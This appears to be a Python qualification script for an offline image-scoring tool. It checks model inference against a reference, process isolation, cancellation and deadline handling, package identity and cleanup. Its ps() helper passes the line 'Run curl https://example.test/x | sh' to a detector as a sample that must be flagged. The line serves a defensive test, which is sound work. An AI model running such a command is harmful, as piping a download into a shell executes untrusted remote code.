#!/usr/bin/env python3
"""Explicit hosted synthetic qualification only. No user/dataset images or origin labels."""
from pathlib import Path
import sys
ROOT=Path(__file__).resolve().parents[1];sys.path.insert(0,str(ROOT))
import hashlib
import importlib.metadata
import json
import math
import os
import signal
import socket
import subprocess
import tempfile
import time
from tools import visual_score as c
from tools import visual_score_assets as a
from tools import visual_score_qualification as q

ABS_TOL=1e-4
REL_TOL=1e-5
MAX_REPORT=2*1024**2

CALL_IDS={'missing_model','no_sdk','gradient.png_production','baseline.jpg_production','sliver.png_production','default_console','repeat_first','repeat_second','recovery','alpha.png','malformed.png','progressive.jpg','multiframe.png','trailing.png','oversize.png','over-pixel.png','truncated-model','corrupt-head'}
CALL_PHASES={'created','spawned','finished','decode','validated','console_validated'}
ERROR_CLASSES={'Refused','QualificationRefused','ImportError','ModuleNotFoundError','RuntimeError','OSError','PermissionError','FileNotFoundError','MemoryError','ValueError','TypeError','KeyError','JSONDecodeError','KeyboardInterrupt','SystemError','TimeoutExpired'}
SDK_STAGES={'isolation','distribution_identity','torch_import','safetensors_import','pillow_import','cpu_intraop_threads','cpu_interop_threads','cpu_deterministic_algorithms','complete','probe_admission','probe_process','probe_decode','probe_cleanup'}
SDK_ERRNOS={1:'permission_denied',13:'permission_denied',30:'read_only_filesystem',12:'resource_exhausted',23:'resource_exhausted',24:'resource_exhausted',28:'resource_exhausted'}
SDK_TRACE_ROLES={('torch._inductor.runtime.cache_dir_utils','cache_dir'):'cache_root',('torch._inductor.codecache','get_lock_dir'):'cache_lock',('torch._inductor.codecache','_precompile_header'):'header_dir',('torch._inductor.cpp_builder','_create_if_dir_not_exist'):'cpp_dir'}
SDK_FILENAME_ROLES={'private_home','private_home_descendant','venv_root','venv_descendant','model_sentinel','other_or_missing'}
PROBE_BODY=b'private-sdk-diagnostic-v1'
PROBE_MODEL_SENTINEL='/qualification-sdk-diagnostic-no-model'

def exception_class(error):
 name=type(error).__name__;return name if name in ERROR_CLASSES else 'other'

def validate_last_call(value):
 q.need(type(value)is dict and set(value)=={'call_id','phase','state','reason','exit_status','exception_class'})
 q.need(value['call_id']in CALL_IDS and value['phase']in CALL_PHASES and value['state']in ('not_validated','OBSERVED','UNAVAILABLE'))
 q.need(value['reason']is None or value['reason']in a.REASONS)
 q.need(value['exit_status']is None or type(value['exit_status'])is int and -128<=value['exit_status']<=255)
 q.need(value['exception_class']is None or value['exception_class']in ERROR_CLASSES|{'other'})
 q.need((value['reason']is not None)==(value['state']=='UNAVAILABLE'))
 q.need(len(json.dumps(value,sort_keys=True).encode())<=1024);return dict(value)

def _sdk_probe_sources():
 return {p:q.sha(q.raw_file(ROOT/p,128*1024))for p in ['scripts/verify-visual-score-qualification.py','tools/visual_score.py','tools/visual_score_runtime.py','tools/visual_score_process.py']}

def _probe_git_version(torch):
 version=torch.__dict__.get('version');fields=version.__dict__ if type(version)is type(sys)else {}
 value=fields.get('git_version')
 return value if type(value)is str and len(value)==40 and all(c in '0123456789abcdef'for c in value)else None

def _probe_filename_role(filename,home,venv):
 def canonical(value):
  return type(value)is str and 0<len(value)<=2048 and value.startswith('/') and not value.startswith('//') and '\0'not in value and all(p not in ('','.','..')for p in value[1:].split('/'))
 if not canonical(filename):return 'other_or_missing'
 if filename==PROBE_MODEL_SENTINEL:return 'model_sentinel'
 for root,role in [(home,'private_home'),(venv,'venv')]:
  if canonical(root):
   if filename==root:return role if role=='private_home'else 'venv_root'
   if filename.startswith(root+'/'):return role+'_descendant'
 return 'other_or_missing'

def _probe_trace_roles(trace):
 roles=[]
 while trace is not None and len(roles)<32:
  frame=trace.tb_frame;module=frame.f_globals.get('__name__');function=frame.f_code.co_name
  role=SDK_TRACE_ROLES.get((module,function),'other')if type(module)is str and len(module)<=256 and type(function)is str and len(function)<=128 else 'other'
  roles.append(role);trace=trace.tb_next
 return roles,trace is not None

def _sdk_probe_infer(raw,model_dir):
 # Fixed qualification child ONLY. c.worker sets unchanged resource limits and
 # adopts the same500 HOME before this fixed infer substitution is invoked.
 stage='isolation';error=None;error_number=None;error_category=None;state='UNAVAILABLE';environment=None
 git_version=None;trace_roles=[];trace_truncated=False;filename_role='other_or_missing';home=os.environ.get('HOME');venv=sys.prefix
 try:
  q.need(raw==PROBE_BODY and model_dir==PROBE_MODEL_SENTINEL)
  from tools import visual_score_runtime as runtime
  environment=runtime.isolation() # c.worker alone does NOT enforce isolation.
  stage='distribution_identity'
  for name,version in runtime.VERSIONS.items():q.need(importlib.metadata.version(name)==version)
  stage='torch_import';import torch
  q.need(torch.__version__==runtime.VERSIONS['torch']);git_version=_probe_git_version(torch)
  stage='safetensors_import';from safetensors import safe_open
  from safetensors.torch import load
  stage='pillow_import';from PIL import Image,features
  stage='cpu_intraop_threads';torch.set_num_threads(1)
  stage='cpu_interop_threads';torch.set_num_interop_threads(1)
  stage='cpu_deterministic_algorithms';torch.use_deterministic_algorithms(True)
  stage='complete';state='SDK_AVAILABLE'
 except Exception as failure:
  error=exception_class(failure)
  candidate=failure.errno if isinstance(failure,OSError)else None
  error_number=candidate if type(candidate)is int and candidate in SDK_ERRNOS else None
  error_category=SDK_ERRNOS.get(error_number,'other_or_missing')
  if isinstance(failure,OSError):
   # Closed observations only; never format a traceback or inspect file targets.
   try:trace_roles,trace_truncated=_probe_trace_roles(failure.__traceback__);filename_role=_probe_filename_role(failure.filename,home,venv)
   except Exception:trace_roles=[];trace_truncated=False;filename_role='other_or_missing'
 return {'format':'qualification-sdk-diagnostic/v1','diagnostic_only':True,'actual_model_forward_completed':False,'stage':stage,'state':state,'exception_class':error,'errno':error_number,'os_error_class':error_category,'isolation':environment,'source_sha256':_sdk_probe_sources(),'observed_torch_git_version':git_version,'trace_roles':trace_roles,'trace_truncated':trace_truncated,'filename_role':filename_role}

def validate_sdk_probe(value):
 q.need(type(value)is dict and set(value)=={'format','diagnostic_only','actual_model_forward_completed','stage','state','exception_class','errno','os_error_class','isolation','source_sha256','observed_torch_git_version','trace_roles','trace_truncated','filename_role'})
 q.need(value['format']=='qualification-sdk-diagnostic/v1' and value['diagnostic_only']is True and value['actual_model_forward_completed']is False and value['stage']in SDK_STAGES and value['state']in ('SDK_AVAILABLE','UNAVAILABLE'))
 q.need(value['exception_class']is None or value['exception_class']in ERROR_CLASSES|{'other'})
 q.need(value['errno']is None or type(value['errno'])is int and value['errno']in SDK_ERRNOS)
 q.need((value['errno']is None and value['os_error_class']is None)if value['state']=='SDK_AVAILABLE'else value['os_error_class']==SDK_ERRNOS.get(value['errno'],'other_or_missing'))
 q.need(value['isolation']is None or value['isolation']=={'loopback_only_observed':True,'capability_sets_zero':True,'no_new_privileges':True,'nonroot':True})
 q.need(value['state']!='SDK_AVAILABLE' or value['stage']=='complete' and value['exception_class']is None and value['isolation']is not None)
 q.need(value['observed_torch_git_version']is None or type(value['observed_torch_git_version'])is str and len(value['observed_torch_git_version'])==40 and all(c in '0123456789abcdef'for c in value['observed_torch_git_version']))
 q.need(type(value['trace_roles'])is list and len(value['trace_roles'])<=32 and all(type(r)is str and r in set(SDK_TRACE_ROLES.values())|{'other'}for r in value['trace_roles']))
 q.need(type(value['trace_truncated'])is bool and (not value['trace_truncated']or len(value['trace_roles'])==32))
 q.need(type(value['filename_role'])is str and value['filename_role']in SDK_FILENAME_ROLES)
 q.need(value['state']!='SDK_AVAILABLE' or value['trace_roles']==[] and value['trace_truncated']is False and value['filename_role']=='other_or_missing')
 q.need(value['source_sha256']==_sdk_probe_sources() and len(json.dumps(value,sort_keys=True).encode())<=2048);return value

def _probe_budget():
 value=os.environ.get('VISUAL_QUAL_FORWARD_STOP_NS','')
 if not value.isascii() or not value.isdecimal() or len(value)>19:return None
 stop=int(value);now=time.monotonic_ns()
 if type(now)is not int or not 0<now<stop<=now+1500*10**9:return None
 remaining=(stop-now)/10**9-6 # leave original ordinary stop's reap/HOME reserve intact
 return (stop,now,min(15.,remaining))if remaining>0 else None

def sdk_failure_probe(last,primary):
 result={'diagnostic_only':True,'state':'SKIPPED','reason':'not_eligible','probe':None}
 if isinstance(primary,KeyboardInterrupt)or last.get('call_id')!='gradient.png_production' or last.get('state')!='UNAVAILABLE' or last.get('reason')not in ('worker_unavailable','runtime_unavailable','inference_unavailable'):return result
 budget=_probe_budget()
 if budget is None:return result|{'reason':'original_budget_unavailable'}
 try:
  with a.PrivateHome()as home:
   # Recheck after HOME creation; this does not create a new timeout window.
   current=_probe_budget()
   if current is None or current[0]!=budget[0] or current[1]<budget[1]:return result|{'reason':'original_budget_unavailable'}
   timeout=min(budget[2],current[2])
   header=json.dumps({'model_dir':PROBE_MODEL_SENTINEL,'image_bytes':len(PROBE_BODY),'cache_dir':home.path,'cache_devino':list(home.origin)},separators=(',',':')).encode()
   from tools.visual_score_process import run
   wire=run([sys.executable,'-I','-B',str(Path(__file__)),'--sdk-diagnostic-worker'],len(header).to_bytes(4,'big')+header+PROBE_BODY,timeout=timeout)
   observed=validate_sdk_probe(json.loads(wire));home.check()
  return {'diagnostic_only':True,'state':'COMPLETED','reason':None,'timeout_seconds':timeout,'probe':observed}
 except BaseException as secondary:
  # The existing supervisor/HOME contexts reap/close first; no diagnostic error
  # can replace the already recorded production failure or produce acceptance.
  reason=secondary.reason if isinstance(secondary,a.Refused)and secondary.reason in a.REASONS else 'diagnostic_unavailable'
  return {'diagnostic_only':True,'state':'UNAVAILABLE','reason':reason,'exception_class':exception_class(secondary),'probe':None}

def native_cli(image,models,timeout=180,python=None,json_output=True,diagnostic=None,call_id=None):
 """Outer guard allows the production150s supervisor to reap and clean its HOME."""
 command=[python or sys.executable,'-I','-B',str(ROOT/'scripts/inspect-visual-score.py'),str(image),'--model-dir',str(models)]+(['--json'] if json_output else [])
 env=q.credential_free();env['TMPDIR']=os.environ['VISUAL_QUAL_TMP']
 if diagnostic is not None:
  q.need(type(diagnostic)is dict and call_id in CALL_IDS);diagnostic.clear();diagnostic.update(call_id=call_id,phase='created',state='not_validated',reason=None,exit_status=None,exception_class=None)
 output=tempfile.TemporaryFile();child=None
 try:
  child=subprocess.Popen(command,stdin=subprocess.DEVNULL,stdout=output,stderr=subprocess.DEVNULL,env=env,start_new_session=True,close_fds=True)
  if diagnostic is not None:diagnostic['phase']='spawned'
  deadline=time.monotonic()+timeout
  while child.poll() is None:
   q.need(time.monotonic()<deadline and os.fstat(output.fileno()).st_size<=16384);time.sleep(.05)
  if diagnostic is not None:diagnostic.update(phase='finished',exit_status=child.returncode if type(child.returncode)is int and -128<=child.returncode<=255 else None)
  q.need(child.returncode in (0,2));output.seek(0);raw=output.read(16385)
  if not json_output:
   q.need(child.returncode==0 and raw.startswith(b'Reference raw logit: ') and b'not a probability' in raw and os.fsencode(image) not in raw and os.fsencode(models) not in raw and hashlib.sha256(q.raw_file(image,a.MAX_IMAGE)).hexdigest().encode() not in raw);return True
  if diagnostic is not None:diagnostic['phase']='decode'
  record=c.decode(raw)
  if record['state']=='OBSERVED':c.validate(record,q.raw_file(image,a.MAX_IMAGE))
  else:q.need(record==c.unavailable(record.get('reason')))
  if diagnostic is not None:diagnostic.update(phase='validated',state=record['state'],reason=record.get('reason')if record['state']=='UNAVAILABLE'else None)
  q.need((child.returncode==0)==(record['state']=='OBSERVED'));return record
 except BaseException as primary:
  if diagnostic is not None:diagnostic['exception_class']=exception_class(primary)
  raise
 finally:
  try:
   if child is not None and child.returncode is None:
    try:os.killpg(child.pid,signal.SIGTERM)
    except ProcessLookupError:pass
    try:child.wait(timeout=5)
    except subprocess.TimeoutExpired:
     if child.returncode is None:
      try:os.killpg(child.pid,signal.SIGKILL)
      except ProcessLookupError:pass
      finally:child.wait(timeout=5)
  finally:output.close()

REFERENCE_IDS={'gradient.png_reference','baseline.jpg_reference','sliver.png_reference'}
REFERENCE_STAGES={'created','reference_request','reference_process','reference_decode','reference_worker_refused','reference_validation','reference_validated','reference_cleanup','comparison_facts','crop_comparison','logit_comparison','compared'}
REFERENCE_REASONS={'reference_unavailable','reference_process_unavailable','reference_decode_unavailable','reference_invalid_record','reference_worker_refused','reference_cleanup_uncertain','crop_mismatch','logit_mismatch'}

def _reference_sources():
 return {**_sdk_probe_sources(),'tools/visual_score_reference.py':q.sha(q.raw_file(ROOT/'tools/visual_score_reference.py',128*1024))}

def _reference_error(error):
 number=error.errno if isinstance(error,OSError)else None
 reason=error.reason if isinstance(error,a.Refused)and error.reason in a.REASONS else 'reference_unavailable'
 return exception_class(error),reason,number if type(number)is int and number in SDK_ERRNOS else None

def reference_failure(error):
 kind,reason,number=_reference_error(error)
 value={'format':'qualification-reference-failure/v1','diagnostic_only':True,'pass':False,'stage':'reference_worker_exception','exception_class':kind,'reason':reason,'errno':number,'source_sha256':_reference_sources()}
 q.need(len(json.dumps(value,sort_keys=True,allow_nan=False).encode())<=2047);return value

def validate_reference_failure(value):
 q.need(type(value)is dict and set(value)=={'format','diagnostic_only','pass','stage','exception_class','reason','errno','source_sha256'})
 q.need(value['format']=='qualification-reference-failure/v1'and value['diagnostic_only']is True and value['pass']is False and value['stage']=='reference_worker_exception')
 q.need(type(value['exception_class'])is str and value['exception_class']in ERROR_CLASSES|{'other'})
 q.need(type(value['reason'])is str and value['reason']in a.REASONS|{'reference_unavailable'})
 q.need(value['errno']is None or type(value['errno'])is int and value['errno']in SDK_ERRNOS)
 q.need(value['source_sha256']==_reference_sources()and len(json.dumps(value,sort_keys=True,allow_nan=False).encode())<=2047);return value

def _reference_number(value):
 try:return type(value)in(int,float)and math.isfinite(value)
 except (ValueError,OverflowError):return False

def _reference_hash(value):return type(value)is str and len(value)==64 and all(c in '0123456789abcdef'for c in value)

def validate_reference_diagnostic(value):
 q.need(type(value)is dict and set(value)=={'call_id','stage','state','reason','exception_class','errno','worker_failure','comparison'})
 q.need(type(value['call_id'])is str and value['call_id']in REFERENCE_IDS and type(value['stage'])is str and value['stage']in REFERENCE_STAGES)
 q.need(value['state']in ('not_validated','REFUSED','VALIDATED')and (value['reason']is None or type(value['reason'])is str and value['reason']in REFERENCE_REASONS|a.REASONS))
 q.need((value['state']=='REFUSED')==(value['reason']is not None))
 q.need(value['exception_class']is None or type(value['exception_class'])is str and value['exception_class']in ERROR_CLASSES|{'other'})
 q.need(value['errno']is None or type(value['errno'])is int and value['errno']in SDK_ERRNOS)
 if value['worker_failure']is not None:
  validate_reference_failure(value['worker_failure']);q.need(value['comparison']is None and value['state']=='REFUSED'and value['stage']=='reference_worker_refused'and value['reason']=='reference_worker_refused'and value['exception_class']==value['worker_failure']['exception_class']and value['errno']==value['worker_failure']['errno'])
 if value['comparison']is not None:
  f=value['comparison'];q.need(type(f)is dict and set(f)=={'production_logit','reference_logit','production_crop_sha256','reference_crop_sha256','crop_equal','within_predeclared_tolerance','absolute_error','absolute_error_overflow','absolute_tolerance','relative_tolerance'})
  q.need(_reference_number(f['production_logit'])and _reference_number(f['reference_logit'])and _reference_hash(f['production_crop_sha256'])and _reference_hash(f['reference_crop_sha256']))
  q.need(type(f['crop_equal'])is bool and f['crop_equal']==(f['production_crop_sha256']==f['reference_crop_sha256']))
  q.need(type(f['within_predeclared_tolerance'])is bool and f['within_predeclared_tolerance']==math.isclose(f['production_logit'],f['reference_logit'],abs_tol=ABS_TOL,rel_tol=REL_TOL))
  difference=abs(f['production_logit']-f['reference_logit']);overflow=not math.isfinite(difference)
  q.need(type(f['absolute_error_overflow'])is bool and f['absolute_error_overflow']==overflow and (f['absolute_error']is None if overflow else _reference_number(f['absolute_error'])and f['absolute_error']==difference))
  q.need(type(f['absolute_tolerance'])is float and f['absolute_tolerance']==ABS_TOL and type(f['relative_tolerance'])is float and f['relative_tolerance']==REL_TOL)
  if value['reason']=='crop_mismatch':q.need(value['stage']=='crop_comparison'and value['state']=='REFUSED'and f['crop_equal']is False)
  if value['reason']=='logit_mismatch':q.need(value['stage']=='logit_comparison'and value['state']=='REFUSED'and f['crop_equal']is True and f['within_predeclared_tolerance']is False)
 q.need(len(json.dumps(value,sort_keys=True,allow_nan=False).encode())<=1536);return dict(value)

def reference(image,models,diagnostic,call_id):
 q.need(type(diagnostic)is dict and call_id in REFERENCE_IDS)
 diagnostic.clear();diagnostic.update(call_id=call_id,stage='created',state='not_validated',reason=None,exception_class=None,errno=None,worker_failure=None,comparison=None)
 try:
  with a.PrivateHome() as home:
   diagnostic['stage']='reference_request'
   raw=q.raw_file(image,a.MAX_IMAGE);header=json.dumps({'model_dir':str(models),'image_bytes':len(raw),'cache_dir':home.path,'cache_devino':list(home.origin)},separators=(',',':')).encode()
   from tools.visual_score_process import run
   diagnostic['stage']='reference_process'
   wire=run([sys.executable,'-I','-B',str(Path(__file__)),'--reference-worker'],len(header).to_bytes(4,'big')+header+raw)
   diagnostic['stage']='reference_decode';result=json.loads(wire)
   if type(result)is dict and result.get('format')=='qualification-reference-failure/v1':
    diagnostic['stage']='reference_validation';validate_reference_failure(result);diagnostic.update(stage='reference_worker_refused',state='REFUSED',reason='reference_worker_refused',exception_class=result['exception_class'],errno=result['errno'],worker_failure=result);q.need(False)
   if result==c.unavailable('inference_unavailable'):
    diagnostic.update(stage='reference_worker_refused',state='REFUSED',reason='reference_worker_refused');q.need(False)
   diagnostic['stage']='reference_validation'
   q.need(type(result)is dict and set(result)=={'reference','raw_logit','crop_rgb_sha256','AI_origin','tags','environment'} and result['tags']==[] and result['AI_origin']=='unknown' and _reference_number(result['raw_logit'])and _reference_hash(result['crop_rgb_sha256']))
   diagnostic['stage']='reference_cleanup';home.check()
  diagnostic.update(stage='reference_validated',state='VALIDATED');return result
 except BaseException as primary:
  try:
   kind,reason,number=_reference_error(primary)
   if diagnostic['reason']is None:
    default={'reference_process':'reference_process_unavailable','reference_decode':'reference_decode_unavailable','reference_validation':'reference_invalid_record','reference_cleanup':'reference_cleanup_uncertain'}.get(diagnostic['stage'],'reference_unavailable')
    diagnostic.update(reason=reason if reason in a.REASONS else default,exception_class=kind,errno=number)
   diagnostic['state']='REFUSED'
  except BaseException:pass
  raise

def compare_reference(result,expected,diagnostic):
 production=result['raw_logit'];reference_logit=expected['raw_logit'];q.need(_reference_number(production)and _reference_number(reference_logit))
 crop_equal=result['method']['crop_rgb_sha256']==expected['crop_rgb_sha256'];within=math.isclose(production,reference_logit,abs_tol=ABS_TOL,rel_tol=REL_TOL)
 try:
  diagnostic['stage']='comparison_facts';difference=abs(production-reference_logit);overflow=not math.isfinite(difference)
  diagnostic['comparison']={'production_logit':production,'reference_logit':reference_logit,'production_crop_sha256':result['method']['crop_rgb_sha256'],'reference_crop_sha256':expected['crop_rgb_sha256'],'crop_equal':crop_equal,'within_predeclared_tolerance':within,'absolute_error':None if overflow else difference,'absolute_error_overflow':overflow,'absolute_tolerance':ABS_TOL,'relative_tolerance':REL_TOL}
 except Exception:pass
 if not crop_equal:
  try:diagnostic.update(stage='crop_comparison',state='REFUSED',reason='crop_mismatch')
  except Exception:pass
  q.need(False)
 if not within:
  try:diagnostic.update(stage='logit_comparison',state='REFUSED',reason='logit_mismatch')
  except Exception:pass
  q.need(False)
 try:diagnostic.update(stage='compared',state='VALIDATED',reason=None)
 except Exception:pass

def process_identity(pid):
 try:
  # /proc/<pid>/stat comm can contain spaces; split after the final ')'.
  with open('/proc/'+str(pid)+'/stat') as stream:line=stream.read(4097)
  q.need(len(line)<=4096);fields=line.rsplit(')',1)[1].split()
  return int(fields[19])
 except (OSError,ValueError,IndexError):return None

def same_process(pid,identity):return identity is not None and process_identity(pid)==identity

def production_stop_probe(image,models,cancel):
 """Stop only positively identified still-owned pure production worker, never a numeric successor."""
 env=q.credential_free();env['TMPDIR']=os.environ['VISUAL_QUAL_TMP'];worker=None;identity=None;child=None
 output=tempfile.TemporaryFile()
 try:
  child=subprocess.Popen([sys.executable,'-I','-B',str(ROOT/'scripts/inspect-visual-score.py'),str(image),'--model-dir',str(models),'--json'],stdin=subprocess.DEVNULL,stdout=output,stderr=subprocess.DEVNULL,start_new_session=True,env=env)
  deadline=time.monotonic()+100
  while time.monotonic()<deadline and child.poll() is None:
   with open(f'/proc/{child.pid}/task/{child.pid}/children') as stream:line=stream.read(4097)
   q.need(len(line)<=4096);children=line.split();q.need(len(children)<=1)
   if children:
    pid=int(children[0]);ident=process_identity(pid)
    try:
     with open(f'/proc/{pid}/cmdline','rb') as stream:command_raw=stream.read(8193)
     with open(f'/proc/{pid}/maps','rb') as stream:maps=stream.read(4*1024**2+1)
     q.need(len(command_raw)<=8192);command=command_raw.split(b'\0')
    except OSError:continue
    q.need(len(maps)<=4*1024**2)
    if command==[os.fsencode(sys.executable),b'-I',b'-B',os.fsencode(ROOT/'scripts/inspect-visual-score.py'),b'--worker',b''] and str(models/'model.safetensors').encode() in maps and same_process(pid,ident) and os.getpgid(pid)==pid:
     worker,identity=pid,ident;os.kill(worker,signal.SIGSTOP);break
   time.sleep(.02)
  q.need(worker is not None and same_process(worker,identity))
  # Independent PS really executes while the model worker is stopped.
  ps()
  if cancel:os.killpg(child.pid,signal.SIGTERM)
  deadline=time.monotonic()+(15 if cancel else 165)
  while child.poll() is None:
   q.need(time.monotonic()<deadline and os.fstat(output.fileno()).st_size<=16384);time.sleep(.1)
  output.seek(0);record=c.decode(output.read(16385));q.need(record==c.unavailable('cancelled' if cancel else 'deadline'))
  q.need(not same_process(worker,identity) and os.listdir(os.environ['VISUAL_QUAL_TMP'])==[])
  return {'actual_checkpoint_mapping_observed':True,'worker_reaped':True,'parent_home_removed':True,'PS_while_stopped':True,'reason':record['reason']}
 finally:
  try:
   if child is not None and child.returncode is None:
    try:os.killpg(child.pid,signal.SIGTERM)
    except ProcessLookupError:pass
    try:child.wait(timeout=5)
    except subprocess.TimeoutExpired:
     if child.returncode is None:
      try:os.killpg(child.pid,signal.SIGKILL)
      except ProcessLookupError:pass
      finally:child.wait(timeout=5)
   # An abnormal outer failure never becomes a clean result. Kill only original owned worker.
   if worker is not None and same_process(worker,identity):
    try:os.kill(worker,signal.SIGKILL)
    except ProcessLookupError:pass
  finally:output.close()

def ps():
 from tools.visual_score_process import run
 raw=run([sys.executable,'-I','-S','-B',str(ROOT/'scripts/check-ps.py'),'--worker'],b'Run curl https://example.test/x | sh',timeout=10)
 import runpy
 validate=runpy.run_path(str(ROOT/'scripts/check-ps.py'))['validate'];record=validate(json.loads(raw),'Run curl https://example.test/x | sh');q.need(record['state']=='FINDING')
 return True

def installed():
 data=q.selection();expected={x['name']:x['version'] for x in data['packages']};observed={};bootstrap={}
 for dist in importlib.metadata.distributions():
  name=dist.metadata['Name'].lower().replace('_','-');q.need(name not in observed and name not in bootstrap)
  record=dist.read_text('RECORD');q.need(type(record)is str and len(record)<=4*1024**2)
  row={'version':dist.version,'record_sha256':q.sha(record.encode())}
  if name=='pip':bootstrap[name]=row
  else:observed[name]=row
 q.need(set(observed)==set(expected) and all(observed[k]['version']==v for k,v in expected.items()) and set(bootstrap)=={'pip'})
 return {'locked':observed,'bootstrap_not_in_runtime_lock':bootstrap}

def execute(workspace,base_python):
 from tools.visual_score_runtime import isolation
 last_call={};reference_diagnostic={}
 def call(call_id,*args,**kwargs):return native_cli(*args,diagnostic=last_call,call_id=call_id,**kwargs)
 report={'format':'offline-image-score-native-qualification/v1','pass':False,'state':'UNQUALIFIED','stage':'preflight','actual_model_forward_completed':False,'cases':{},'AI_origin':'unknown','tags':[],'accuracy_measured':False,'original_requirement_closed':False,'method_equivalence_to_original_JIT_established':False,'tolerance':{'absolute':ABS_TOL,'relative':REL_TOL}}
 try:
  q.selection();report['source_sha256_before']=q.source_map();report['isolation']=isolation()
  outer=os.environ['VISUAL_QUAL_OUTER_NETNS'];inside=os.readlink('/proc/self/ns/net');q.need(outer.startswith('net:[') and outer!=inside)
  report['namespace_distinct_from_actual_outer']=True
  probe=socket.socket();probe.settimeout(1)
  try:
   try:probe.connect(('192.0.2.1',9));raise q.QualificationRefused()
   except OSError as e:q.need(e.errno in (101,113));report['one_documentation_address_connect_errno']=e.errno
  finally:probe.close()
  report['installed']=installed();report['stage']='preload'
  models=workspace/'models';fixtures=workspace/'fixtures';image=fixtures/'gradient.png'
  os.environ['VISUAL_QUAL_TMP']=str(workspace/'tmp');tempfile.tempdir=str(workspace/'tmp')
  q.need(os.listdir(workspace/'tmp')==[])
  report['cases']['missing_model']=call('missing_model',image,workspace/'absent')==c.unavailable('model_missing');q.need(report['cases']['missing_model']);ps()
  report['cases']['no_sdk']=call('no_sdk',image,models,python=base_python)['state']=='UNAVAILABLE';q.need(report['cases']['no_sdk'])
  report['wheel_notice_observations']=q.notice_observations(workspace)
  report['stage']='actual_forward';observations={}
  for name in ['gradient.png','baseline.jpg','sliver.png']:
   reference_diagnostic.clear()
   result=call(name+'_production',fixtures/name,models);q.need(result['state']=='OBSERVED');report['actual_model_forward_completed']=True;expected=reference(fixtures/name,models,reference_diagnostic,name+'_reference')
   compare_reference(result,expected,reference_diagnostic)
   observations[name]={'subject':result['subject'],'method':result['method'],'raw_logit':result['raw_logit'],'reference_logit':expected['raw_logit'],'crop_equal':True,'within_predeclared_tolerance':True}
   reference_diagnostic.clear()
  report['observations']=observations;report['cases']['default_console_private_fields_absent']=call('default_console',image,models,json_output=False)
  first=call('repeat_first',image,models);q.need(first==call('repeat_second',image,models));report['cases']['repeat_whole_record']=True
  for name in ['alpha.png','malformed.png','progressive.jpg','multiframe.png','trailing.png','oversize.png','over-pixel.png']:
   result=call(name,fixtures/name,models);q.need(result['state']=='UNAVAILABLE');report['cases'][name]=result['reason']
  for name in ['truncated-model','corrupt-head']:
   result=call(name,image,workspace/name);q.need(result['state']=='UNAVAILABLE' and result['reason']=='model_identity');report['cases'][name]=result['reason']
  report['stage']='owned_process_controls';report['cases']['production_cancel']=production_stop_probe(image,models,True)
  report['cases']['production_deadline']=production_stop_probe(image,models,False)
  q.need(call('recovery',image,models)['state']=='OBSERVED');report['cases']['recovery']=True;ps();report['cases']['PS_independent']=True
  q.notice_observations(workspace);q.need(os.listdir(workspace/'tmp')==[]);report['source_sha256_after']=q.source_map();q.need(report['source_sha256_after']==report['source_sha256_before']);report['pass']=True;report['state']='FORWARD_CONTROLS_COMPLETED_CLEANUP_PENDING';report['stage']='complete'
 except BaseException as primary:
  report['pass']=False;report['state']='UNQUALIFIED';report['reason']='qualification_failed'
  try:
   last=validate_last_call(last_call)
   diagnostics={'primary_exception_class':exception_class(primary),'last_call':last,'sdk_probe':{'diagnostic_only':True,'state':'UNAVAILABLE','reason':'diagnostic_unavailable','probe':None}}
   try:diagnostics['sdk_probe']=sdk_failure_probe(last,primary)
   except BaseException:pass
   if reference_diagnostic:
    try:diagnostics['reference_call']=validate_reference_diagnostic(reference_diagnostic)
    except BaseException:diagnostics['reference_metadata_unavailable']=True
   q.need(len(json.dumps(diagnostics,sort_keys=True,allow_nan=False).encode())<=4096)
   report['failure_diagnostics']=diagnostics
  except BaseException:pass # preserve the original failure even if diagnostics fail
 return report

def main():
 import argparse
 p=q.Parser();p.add_argument('--workspace',required=True);p.add_argument('--base-python',required=True);p.add_argument('--output',required=True)
 args=p.parse_args();report=execute(Path(args.workspace),args.base_python);raw=json.dumps(report,sort_keys=True,allow_nan=False).encode();q.need(len(raw)<=MAX_REPORT);q.write_new(Path(args.output),raw);return 0 if report['pass'] else 2

if __name__=='__main__':
 if sys.argv[1:]==['--sdk-diagnostic-worker']:
  from tools import visual_score_runtime as runtime
  runtime.infer=_sdk_probe_infer
  c.worker()
 elif sys.argv[1:]==['--reference-worker']:
  from tools import visual_score_runtime as runtime
  from tools.visual_score_reference import infer
  runtime.infer=infer
  try:c.worker()
  except Exception as failure:
   try:failed=reference_failure(failure)
   except Exception:failed=c.unavailable('inference_unavailable')
   print(json.dumps(failed,sort_keys=True,allow_nan=False))
 else:
  def interrupted(signum,frame):raise KeyboardInterrupt
  signal.signal(signal.SIGTERM,interrupted)
  try:raise SystemExit(main())
  except Exception:print('{"pass":false,"reason":"qualification_refused"}');raise SystemExit(2)
